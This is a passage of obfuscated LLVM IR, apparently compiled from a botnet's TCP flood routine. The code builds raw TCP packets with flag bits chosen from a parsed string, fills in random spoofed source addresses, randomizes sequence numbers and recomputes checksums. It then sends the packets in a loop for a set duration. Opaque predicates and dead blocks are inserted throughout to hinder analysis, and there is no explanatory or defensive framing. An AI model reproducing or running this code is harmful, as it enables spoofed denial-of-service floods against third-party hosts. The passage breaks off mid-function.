  %127 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %126, i32 0, i32 0
  store i16 %123, i16* %127, align 4
  %128 = call i32 @rand_cmwc()
  %129 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon.1* %130 to %struct.anon.2*
  %132 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %131, i32 0, i32 2
  store i32 %128, i32* %132, align 4
  %133 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon.1* %134 to %struct.anon.2*
  %136 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %135, i32 0, i32 3
  store i32 0, i32* %136, align 4
  %137 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %138 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %137, i32 0, i32 0
  %139 = bitcast %union.anon.1* %138 to %struct.anon.2*
  %140 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %139, i32 0, i32 4
  %141 = load i16, i16* %140, align 4
  %142 = and i16 %141, -241
  %143 = or i16 %142, 80
  store i16 %143, i16* %140, align 4
  %144 = load i8*, i8** %12, align 8
  %145 = call i32 @strcmp(i8* %144, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i32 0, i32 0)) #10
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %183, label %147

; <label>:147:                                    ; preds = %100
  %148 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.1* %149 to %struct.anon.2*
  %151 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = and i16 %152, -513
  %154 = or i16 %153, 512
  store i16 %154, i16* %151, align 4
  %155 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %156 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %155, i32 0, i32 0
  %157 = bitcast %union.anon.1* %156 to %struct.anon.2*
  %158 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %157, i32 0, i32 4
  %159 = load i16, i16* %158, align 4
  %160 = and i16 %159, -1025
  %161 = or i16 %160, 1024
  store i16 %161, i16* %158, align 4
  %162 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %163 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %162, i32 0, i32 0
  %164 = bitcast %union.anon.1* %163 to %struct.anon.2*
  %165 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %164, i32 0, i32 4
  %166 = load i16, i16* %165, align 4
  %167 = and i16 %166, -257
  %168 = or i16 %167, 256
  store i16 %168, i16* %165, align 4
  %169 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %170 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %169, i32 0, i32 0
  %171 = bitcast %union.anon.1* %170 to %struct.anon.2*
  %172 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %171, i32 0, i32 4
  %173 = load i16, i16* %172, align 4
  %174 = and i16 %173, -4097
  %175 = or i16 %174, 4096
  store i16 %175, i16* %172, align 4
  %176 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  %178 = bitcast %union.anon.1* %177 to %struct.anon.2*
  %179 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %178, i32 0, i32 4
  %180 = load i16, i16* %179, align 4
  %181 = and i16 %180, -2049
  %182 = or i16 %181, 2048
  store i16 %182, i16* %179, align 4
  br label %401

; <label>:183:                                    ; preds = %100
  %184 = load i32, i32* @x.39
  %185 = load i32, i32* @y.40
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %183
  %192 = load i8*, i8** %12, align 8
  %193 = call i8* @strtok(i8* %192, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %193, i8** %23, align 8
  %194 = load i32, i32* @x.39
  %195 = load i32, i32* @y.40
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %202

; <label>:202:                                    ; preds = %originalBBpart277, %originalBBpart28
  %203 = load i32, i32* @x.39
  %204 = load i32, i32* @y.40
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %202
  %211 = load i8*, i8** %23, align 8
  %212 = icmp ne i8* %211, null
  %213 = load i32, i32* @x.39
  %214 = load i32, i32* @y.40
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %212, label %221, label %384

; <label>:221:                                    ; preds = %originalBBpart212
  %222 = load i8*, i8** %23, align 8
  %223 = call i32 @strcmp(i8* %222, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i32 0, i32 0)) #10
  %224 = icmp ne i32 %223, 0
  br i1 %224, label %249, label %225

; <label>:225:                                    ; preds = %221
  %226 = load i32, i32* @x.39
  %227 = load i32, i32* @y.40
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %225
  %234 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon.1* %235 to %struct.anon.2*
  %237 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %238, -513
  %240 = or i16 %239, 512
  store i16 %240, i16* %237, align 4
  %241 = load i32, i32* @x.39
  %242 = load i32, i32* @y.40
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart236, label %originalBB14alteredBB

originalBBpart236:                                ; preds = %originalBB14
  br label %366

; <label>:249:                                    ; preds = %221
  %250 = load i8*, i8** %23, align 8
  %251 = call i32 @strcmp(i8* %250, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i32 0, i32 0)) #10
  %252 = icmp ne i32 %251, 0
  br i1 %252, label %261, label %253

; <label>:253:                                    ; preds = %249
  %254 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 0
  %256 = bitcast %union.anon.1* %255 to %struct.anon.2*
  %257 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %256, i32 0, i32 4
  %258 = load i16, i16* %257, align 4
  %259 = and i16 %258, -1025
  %260 = or i16 %259, 1024
  store i16 %260, i16* %257, align 4
  br label %365

; <label>:261:                                    ; preds = %249
  %262 = load i32, i32* @x.39
  %263 = load i32, i32* @y.40
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %261
  %270 = load i8*, i8** %23, align 8
  %271 = call i32 @strcmp(i8* %270, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i32 0, i32 0)) #10
  %272 = icmp ne i32 %271, 0
  %273 = load i32, i32* @x.39
  %274 = load i32, i32* @y.40
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %272, label %305, label %281

; <label>:281:                                    ; preds = %originalBBpart240
  %282 = load i32, i32* @x.39
  %283 = load i32, i32* @y.40
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %281
  %290 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 0
  %292 = bitcast %union.anon.1* %291 to %struct.anon.2*
  %293 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %292, i32 0, i32 4
  %294 = load i16, i16* %293, align 4
  %295 = and i16 %294, -257
  %296 = or i16 %295, 256
  store i16 %296, i16* %293, align 4
  %297 = load i32, i32* @x.39
  %298 = load i32, i32* @y.40
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBBpart265, label %originalBB42alteredBB

originalBBpart265:                                ; preds = %originalBB42
  br label %364

; <label>:305:                                    ; preds = %originalBBpart240
  %306 = load i8*, i8** %23, align 8
  %307 = call i32 @strcmp(i8* %306, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0)) #10
  %308 = icmp ne i32 %307, 0
  br i1 %308, label %317, label %309

; <label>:309:                                    ; preds = %305
  %310 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 0
  %312 = bitcast %union.anon.1* %311 to %struct.anon.2*
  %313 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %312, i32 0, i32 4
  %314 = load i16, i16* %313, align 4
  %315 = and i16 %314, -4097
  %316 = or i16 %315, 4096
  store i16 %316, i16* %313, align 4
  br label %347

; <label>:317:                                    ; preds = %305
  %318 = load i32, i32* @x.39
  %319 = load i32, i32* @y.40
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %317
  %326 = load i8*, i8** %23, align 8
  %327 = call i32 @strcmp(i8* %326, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i32 0, i32 0)) #10
  %328 = icmp ne i32 %327, 0
  %329 = load i32, i32* @x.39
  %330 = load i32, i32* @y.40
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %328, label %345, label %337

; <label>:337:                                    ; preds = %originalBBpart269
  %338 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %339 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %338, i32 0, i32 0
  %340 = bitcast %union.anon.1* %339 to %struct.anon.2*
  %341 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %340, i32 0, i32 4
  %342 = load i16, i16* %341, align 4
  %343 = and i16 %342, -2049
  %344 = or i16 %343, 2048
  store i16 %344, i16* %341, align 4
  br label %346

; <label>:345:                                    ; preds = %originalBBpart269
  br label %346

; <label>:346:                                    ; preds = %345, %337
  br label %347

; <label>:347:                                    ; preds = %346, %309
  %348 = load i32, i32* @x.39
  %349 = load i32, i32* @y.40
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %347
  %356 = load i32, i32* @x.39
  %357 = load i32, i32* @y.40
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %364

; <label>:364:                                    ; preds = %originalBBpart273, %originalBBpart265
  br label %365

; <label>:365:                                    ; preds = %364, %253
  br label %366

; <label>:366:                                    ; preds = %365, %originalBBpart236
  %367 = load i32, i32* @x.39
  %368 = load i32, i32* @y.40
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %366
  %375 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %375, i8** %23, align 8
  %376 = load i32, i32* @x.39
  %377 = load i32, i32* @y.40
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %202

; <label>:384:                                    ; preds = %originalBBpart212
  %385 = load i32, i32* @x.39
  %386 = load i32, i32* @y.40
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %384
  %393 = load i32, i32* @x.39
  %394 = load i32, i32* @y.40
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br label %401

; <label>:401:                                    ; preds = %originalBBpart281, %147
  %402 = load i32, i32* @x.39
  %403 = load i32, i32* @y.40
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %401
  %410 = call i32 @rand_cmwc()
  %411 = trunc i32 %410 to i16
  %412 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 0
  %414 = bitcast %union.anon.1* %413 to %struct.anon.2*
  %415 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %414, i32 0, i32 5
  store i16 %411, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 0
  %418 = bitcast %union.anon.1* %417 to %struct.anon.2*
  %419 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %418, i32 0, i32 6
  store i16 0, i16* %419, align 4
  %420 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 0
  %422 = bitcast %union.anon.1* %421 to %struct.anon.2*
  %423 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %422, i32 0, i32 7
  store i16 0, i16* %423, align 2
  %424 = load i32, i32* %9, align 4
  %425 = icmp eq i32 %424, 0
  %426 = load i32, i32* @x.39
  %427 = load i32, i32* @y.40
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br i1 %425, label %434, label %452

; <label>:434:                                    ; preds = %originalBBpart285
  %435 = load i32, i32* @x.39
  %436 = load i32, i32* @y.40
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %434
  %443 = call i32 @rand_cmwc()
  %444 = load i32, i32* @x.39
  %445 = load i32, i32* @y.40
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br label %457

; <label>:452:                                    ; preds = %originalBBpart285
  %453 = load i32, i32* %9, align 4
  %454 = trunc i32 %453 to i16
  %455 = call zeroext i16 @htons(i16 zeroext %454) #9
  %456 = zext i16 %455 to i32
  br label %457

; <label>:457:                                    ; preds = %452, %originalBBpart289
  %458 = phi i32 [ %443, %originalBBpart289 ], [ %456, %452 ]
  %459 = load i32, i32* @x.39
  %460 = load i32, i32* @y.40
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %457
  %467 = trunc i32 %458 to i16
  %468 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %469 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %468, i32 0, i32 0
  %470 = bitcast %union.anon.1* %469 to %struct.anon.2*
  %471 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %470, i32 0, i32 1
  store i16 %467, i16* %471, align 2
  %472 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %473 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %474 = call zeroext i16 @tcpcsum(%struct.iphdr* %472, %struct.tcphdr* %473)
  %475 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %476 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %475, i32 0, i32 0
  %477 = bitcast %union.anon.1* %476 to %struct.anon.2*
  %478 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %477, i32 0, i32 6
  store i16 %474, i16* %478, align 4
  %479 = bitcast i8* %105 to i16*
  %480 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %481 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %480, i32 0, i32 2
  %482 = load i16, i16* %481, align 2
  %483 = zext i16 %482 to i32
  %484 = call zeroext i16 @csum(i16* %479, i32 %483)
  %485 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %486 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %485, i32 0, i32 7
  store i16 %484, i16* %486, align 2
  %487 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %488 = load i32, i32* %10, align 4
  %489 = add nsw i32 %487, %488
  store i32 %489, i32* %24, align 4
  store i32 0, i32* %25, align 4
  %490 = load i32, i32* @x.39
  %491 = load i32, i32* @y.40
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart2103, label %originalBB91alteredBB

originalBBpart2103:                               ; preds = %originalBB91
  br label %498

; <label>:498:                                    ; preds = %583, %582, %originalBBpart2103
  br label %499

; <label>:499:                                    ; preds = %498
  %500 = load i32, i32* @x.39
  %501 = load i32, i32* @y.40
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %499
  %508 = load i32, i32* %17, align 4
  %509 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %510 = call i64 @sendto(i32 %508, i8* %105, i64 %103, i32 0, %struct.sockaddr* %509, i32 16)
  %511 = load i32, i32* %19, align 4
  %512 = call i32 @getRandomIP(i32 %511)
  %513 = call i32 @htonl(i32 %512) #9
  %514 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %515 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %514, i32 0, i32 8
  store i32 %513, i32* %515, align 4
  %516 = call i32 @rand_cmwc()
  %517 = trunc i32 %516 to i16
  %518 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %519 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %518, i32 0, i32 3
  store i16 %517, i16* %519, align 4
  %520 = call i32 @rand_cmwc()
  %521 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %522 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %521, i32 0, i32 0
  %523 = bitcast %union.anon.1* %522 to %struct.anon.2*
  %524 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %523, i32 0, i32 2
  store i32 %520, i32* %524, align 4
  %525 = call i32 @rand_cmwc()
  %526 = trunc i32 %525 to i16
  %527 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %528 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %527, i32 0, i32 0
  %529 = bitcast %union.anon.1* %528 to %struct.anon.2*
  %530 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %529, i32 0, i32 0
  store i16 %526, i16* %530, align 4
  %531 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %532 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %531, i32 0, i32 0
  %533 = bitcast %union.anon.1* %532 to %struct.anon.2*
  %534 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %533, i32 0, i32 6
  store i16 0, i16* %534, align 4
  %535 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %536 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %537 = call zeroext i16 @tcpcsum(%struct.iphdr* %535, %struct.tcphdr* %536)
  %538 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 0
  %540 = bitcast %union.anon.1* %539 to %struct.anon.2*
  %541 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %540, i32 0, i32 6
  store i16 %537, i16* %541, align 4
  %542 = bitcast i8* %105 to i16*
  %543 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %544 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %543, i32 0, i32 2
  %545 = load i16, i16* %544, align 2
  %546 = zext i16 %545 to i32
  %547 = call zeroext i16 @csum(i16* %542, i32 %546)
  %548 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i32 0, i32 7
  store i16 %547, i16* %549, align 2
  %550 = load i32, i32* %25, align 4
  %551 = load i32, i32* %15, align 4
  %552 = icmp eq i32 %550, %551
  %553 = load i32, i32* @x.39
  %554 = load i32, i32* @y.40
  %555 = sub i32 %553, 1
  %556 = mul i32 %553, %555
  %557 = urem i32 %556, 2
  %558 = icmp eq i32 %557, 0
  %559 = icmp slt i32 %554, 10
  %560 = or i1 %558, %559
  br i1 %560, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br i1 %552, label %561, label %583

; <label>:561:                                    ; preds = %originalBBpart2107
  %562 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %563 = load i32, i32* %24, align 4
  %564 = icmp sgt i32 %562, %563
  br i1 %564, label %565, label %582

; <label>:565:                                    ; preds = %561
  %566 = load i32, i32* @x.39
  %567 = load i32, i32* @y.40
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %565
  %574 = load i32, i32* @x.39
  %575 = load i32, i32* @y.40
  %576 = sub i32 %574, 1
  %577 = mul i32 %574, %576
  %578 = urem i32 %577, 2
  %579 = icmp eq i32 %578, 0
  %580 = icmp slt i32 %575, 10
  %581 = or i1 %579, %580
  br i1 %581, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br label %586

; <label>:582:                                    ; preds = %561
  store i32 0, i32* %25, align 4
  br label %498

; <label>:583:                                    ; preds = %originalBBpart2107
  %584 = load i32, i32* %25, align 4
  %585 = add i32 %584, 1
  store i32 %585, i32* %25, align 4
  br label %498

; <label>:586:                                    ; preds = %originalBBpart2111
  %587 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %587)
  br label %588

; <label>:588:                                    ; preds = %586, %originalBBpart24, %67, %60
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %39
  %589 = load i8*, i8** %8, align 8
  %590 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %591 = call i32 @getHost(i8* %589, %struct.in_addr* %590)
  %592 = icmp ne i32 %591, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %73
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %183
  %593 = load i8*, i8** %12, align 8
  %594 = call i8* @strtok(i8* %593, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %594, i8** %23, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %202
  %595 = load i8*, i8** %23, align 8
  %596 = icmp ne i8* %595, null
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %225
  %597 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 0
  %599 = bitcast %union.anon.1* %598 to %struct.anon.2*
  %600 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %599, i32 0, i32 4
  %601 = load i16, i16* %600, align 4
  %_ = sub i16 %601, -513
  %gen = mul i16 %_, -513
  %_15 = sub i16 0, %601
  %gen16 = add i16 %_15, -513
  %_17 = sub i16 %601, -513
  %gen18 = mul i16 %_17, -513
  %_19 = sub i16 0, %601
  %gen20 = add i16 %_19, -513
  %_21 = sub i16 0, %601
  %gen22 = add i16 %_21, -513
  %602 = and i16 %601, -513
  %_23 = sub i16 %602, 512
  %gen24 = mul i16 %_23, 512
  %_25 = sub i16 0, %602
  %gen26 = add i16 %_25, 512
  %_27 = sub i16 0, %602
  %gen28 = add i16 %_27, 512
  %_29 = sub i16 0, %602
  %gen30 = add i16 %_29, 512
  %_31 = sub i16 %602, 512
  %gen32 = mul i16 %_31, 512
  %_33 = sub i16 0, %602
  %gen34 = add i16 %_33, 512
  %603 = or i16 %602, 512
  store i16 %603, i16* %600, align 4
  br label %originalBB14

originalBB38alteredBB:                            ; preds = %originalBB38, %261
  %604 = load i8*, i8** %23, align 8
  %605 = call i32 @strcmp(i8* %604, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i32 0, i32 0)) #10
  %606 = icmp ne i32 %605, 0
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %281
  %607 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %608 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %607, i32 0, i32 0
  %609 = bitcast %union.anon.1* %608 to %struct.anon.2*
  %610 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %609, i32 0, i32 4
  %611 = load i16, i16* %610, align 4
  %_43 = sub i16 %611, -257
  %gen44 = mul i16 %_43, -257
